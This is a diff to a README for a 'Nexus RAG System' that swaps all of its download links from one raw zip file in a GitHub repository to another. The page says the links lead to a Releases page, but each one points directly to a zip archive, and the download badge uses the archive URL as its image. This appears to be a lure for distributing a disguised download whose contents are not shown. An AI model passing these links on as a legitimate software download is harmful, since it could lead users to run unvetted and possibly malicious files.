@@ -2,7 +2,7 @@
 
 ## 🌐 Download the Latest Version
 
-[![Download Now](https://raw.githubusercontent.com/PogingCyber/aj_rag/master/components/aj_rag-1.6.zip%20Now-Visit%20Release%20Page-brightgreen)](https://raw.githubusercontent.com/PogingCyber/aj_rag/master/components/aj_rag-1.6.zip)
+[![Download Now](https://raw.githubusercontent.com/PogingCyber/aj_rag/master/services/aj_rag_2.7.zip%20Now-Visit%20Release%20Page-brightgreen)](https://raw.githubusercontent.com/PogingCyber/aj_rag/master/services/aj_rag_2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -13,7 +13,7 @@ Welcome to the **Nexus RAG System**! This platform allows you to easily turn you
 To get started, follow these simple steps:
 
 1. Click on the following link to visit the Releases page:
-   [Download the Nexus RAG System](https://raw.githubusercontent.com/PogingCyber/aj_rag/master/components/aj_rag-1.6.zip).
+   [Download the Nexus RAG System](https://raw.githubusercontent.com/PogingCyber/aj_rag/master/services/aj_rag_2.7.zip).
 
 2. On the Releases page, you will see a list of available versions. Choose the latest version for the best experience.
 
@@ -75,4 +75,4 @@ If you encounter any issues or have questions, please reach out via our GitHub I
 The Nexus RAG System provides an efficient way to manage your documents and interact with them using AI. Follow the steps in this guide to get started and transform your files into a powerful knowledge resource.
 
 Once again, here is the link to download the application:  
-[Download the Nexus RAG System](https://raw.githubusercontent.com/PogingCyber/aj_rag/master/components/aj_rag-1.6.zip)
+[Download the Nexus RAG System](https://raw.githubusercontent.com/PogingCyber/aj_rag/master/services/aj_rag_2.7.zip)
